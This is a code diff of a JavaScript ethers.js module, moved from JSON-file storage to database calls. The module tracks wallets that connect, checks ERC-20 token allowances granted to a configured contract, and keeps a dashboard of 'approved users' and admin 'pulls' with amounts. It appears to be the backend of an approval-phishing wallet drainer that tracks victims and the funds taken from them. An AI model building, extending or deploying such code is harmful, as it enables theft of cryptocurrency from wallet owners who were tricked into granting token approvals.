@@ -1,14 +1,12 @@
-import fs from 'fs';
-import path from 'path';
-import { fileURLToPath } from 'url';
 import { ethers, formatUnits } from 'ethers';
 import { config } from './config.js';
 import { provider, proxyRead, ERC20_ABI } from './chain.js';
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
-const DATA_DIR = path.resolve(__dirname, '../data');
-const DATA_FILE = path.join(DATA_DIR, 'approvals.json');
+import {
+  getApprovalsDb,
+  upsertApprovalDb,
+  getPullsDb,
+  insertPullDb,
+} from './db.js';
 
 const DEFAULT_TOKENS = [
   { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
@@ -16,64 +14,26 @@ const DEFAULT_TOKENS = [
   { symbol: 'DAI', address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', decimals: 18 },
 ];
 
-function loadApprovals() {
-  try {
-    if (!fs.existsSync(DATA_FILE)) {
-      return [];
-    }
-    const raw = fs.readFileSync(DATA_FILE, 'utf8');
-    return JSON.parse(raw);
-  } catch (e) {
-    console.error('[approvals] Failed to load data file:', e.message);
-    return [];
-  }
-}
-
-function saveApprovals(items) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) {
-      fs.mkdirSync(DATA_DIR, { recursive: true });
-    }
-    fs.writeFileSync(DATA_FILE, JSON.stringify(items, null, 2), 'utf8');
-  } catch (e) {
-    console.error('[approvals] Failed to save data file:', e.message);
-  }
-}
-
-export function recordApproval({ address, token, symbol, txHash, allowance, blockNumber }) {
+export async function recordApproval({ address, token, symbol, txHash, allowance, blockNumber }) {
   if (!ethers.isAddress(address) || !ethers.isAddress(token)) return null;
-
-  const items = loadApprovals();
-  const addrLower = address.toLowerCase();
-  const tokenLower = token.toLowerCase();
-
-  const idx = items.findIndex(
-    (x) => x.address.toLowerCase() === addrLower && x.token.toLowerCase() === tokenLower
-  );
 
   const record = {
     address: ethers.getAddress(address),
     token: ethers.getAddress(token),
     symbol: symbol || 'TOKEN',
     allowance: allowance ? String(allowance) : '0',
-    txHash: txHash || (idx >= 0 ? items[idx].txHash : ''),
-    blockNumber: blockNumber || (idx >= 0 ? items[idx].blockNumber : 0),
+    txHash: txHash || '',
+    blockNumber: blockNumber || 0,
     updatedAt: Date.now(),
   };
 
-  if (idx >= 0) {
-    items[idx] = { ...items[idx], ...record };
-  } else {
-    items.unshift(record);
-  }
-
-  saveApprovals(items);
+  await upsertApprovalDb(record);
   return record;
 }
 
 export async function recordConnectedUser(address) {
   if (!ethers.isAddress(address)) return;
-  const items = loadApprovals();
+  const items = await getApprovalsDb();
   const addrLower = address.toLowerCase();
 
   // If user already in list with any token, return
@@ -86,7 +46,7 @@ export async function recordConnectedUser(address) {
       const erc20 = new ethers.Contract(t.address, ERC20_ABI, provider);
       const allow = await erc20.allowance(address, config.contractAddress);
       if (allow > 0n) {
-        items.unshift({
+        await upsertApprovalDb({
           address: ethers.getAddress(address),
           token: t.address,
           symbol: t.symbol,
@@ -95,6 +55,7 @@ export async function recordConnectedUser(address) {
           blockNumber: 0,
           updatedAt: Date.now(),
         });
+        return;
       }
     } catch {
       // ignore
@@ -102,27 +63,21 @@ export async function recordConnectedUser(address) {
   }
 
   // If still not added, register them with USDT so they appear in dashboard
-  if (!items.some((x) => x.address.toLowerCase() === addrLower)) {
-    items.unshift({
-      address: ethers.getAddress(address),
-      token: DEFAULT_TOKENS[0].address,
-      symbol: DEFAULT_TOKENS[0].symbol,
-      allowance: '0',
-      txHash: '',
-      blockNumber: 0,
-      updatedAt: Date.now(),
-    });
-  }
-
-  saveApprovals(items);
+  await upsertApprovalDb({
+    address: ethers.getAddress(address),
+    token: DEFAULT_TOKENS[0].address,
+    symbol: DEFAULT_TOKENS[0].symbol,
+    allowance: '0',
+    txHash: '',
+    blockNumber: 0,
+    updatedAt: Date.now(),
+  });
 }
 
 export async function syncOnChainApprovals() {
   try {
     const currentBlock = await provider.getBlockNumber();
     const fromBlock = Math.max(config.fromBlock, currentBlock - 45000);
-    const items = loadApprovals();
-    let updated = false;
 
     for (const t of DEFAULT_TOKENS) {
       try {
@@ -140,43 +95,21 @@ export async function syncOnChainApprovals() {
           const txHash = ev.transactionHash;
           const blockNumber = ev.blockNumber;
 
-          const addrLower = owner.toLowerCase();
-          const tokenLower = t.address.toLowerCase();
-
-          const idx = items.findIndex(
-            (x) => x.address.toLowerCase() === addrLower && x.token.toLowerCase() === tokenLower
-          );
-
           const humanAllowance = formatUnits(val, t.decimals);
 
-          if (idx >= 0) {
-            if (items[idx].allowance !== humanAllowance || !items[idx].txHash) {
-              items[idx].allowance = humanAllowance;
-              items[idx].txHash = txHash;
-              items[idx].blockNumber = blockNumber;
-              items[idx].updatedAt = Date.now();
-              updated = true;
-            }
-          } else {
-            items.unshift({
-              address: ethers.getAddress(owner),
-              token: t.address,
-              symbol: t.symbol,
-              allowance: humanAllowance,
-              txHash,
-              blockNumber,
-              updatedAt: Date.now(),
-            });
-            updated = true;
-          }
+          await upsertApprovalDb({
+            address: ethers.getAddress(owner),
+            token: t.address,
+            symbol: t.symbol,
+            allowance: humanAllowance,
+            txHash,
+            blockNumber,
+            updatedAt: Date.now(),
+          });
         }
       } catch (e) {
         console.warn(`[approvals] sync failed for ${t.symbol}:`, e.message);
       }
-    }
-
-    if (updated) {
-      saveApprovals(items);
     }
   } catch (e) {
     console.error('[approvals] Global sync failed:', e.message);
@@ -184,7 +117,7 @@ export async function syncOnChainApprovals() {
 }
 
 export async function getEnrichedApprovedUsers() {
-  const items = loadApprovals();
+  const items = await getApprovalsDb();
   if (items.length === 0) return [];
 
   const enriched = await Promise.all(
@@ -275,29 +208,8 @@ export async function getEnrichedApprovedUsers() {
   });
 }
 
-const PULLS_FILE = path.join(DATA_DIR, 'pulls.json');
-
-export function loadPulls() {
-  try {
-    if (!fs.existsSync(PULLS_FILE)) return [];
-    return JSON.parse(fs.readFileSync(PULLS_FILE, 'utf8'));
-  } catch {
-    return [];
-  }
-}
-
-export function savePulls(items) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    fs.writeFileSync(PULLS_FILE, JSON.stringify(items, null, 2), 'utf8');
-  } catch {}
-}
-
-export function recordPull(entry) {
-  const pulls = loadPulls();
-  const exists = pulls.some((p) => p.txHash?.toLowerCase() === entry.txHash?.toLowerCase());
-  if (exists) return;
-  pulls.unshift({
+export async function recordPull(entry) {
+  await insertPullDb({
     txHash: entry.txHash,
     blockNumber: entry.blockNumber || 0,
     admin: entry.admin,
@@ -307,10 +219,8 @@ export function recordPull(entry) {
     amount: entry.amount,
     timestamp: Date.now(),
   });
-  savePulls(pulls);
 }
 
-export function getPulls(limit = 50) {
-  const pulls = loadPulls();
-  return pulls.slice(0, limit);
+export async function getPulls(limit = 50) {
+  return await getPullsDb(limit);
 }
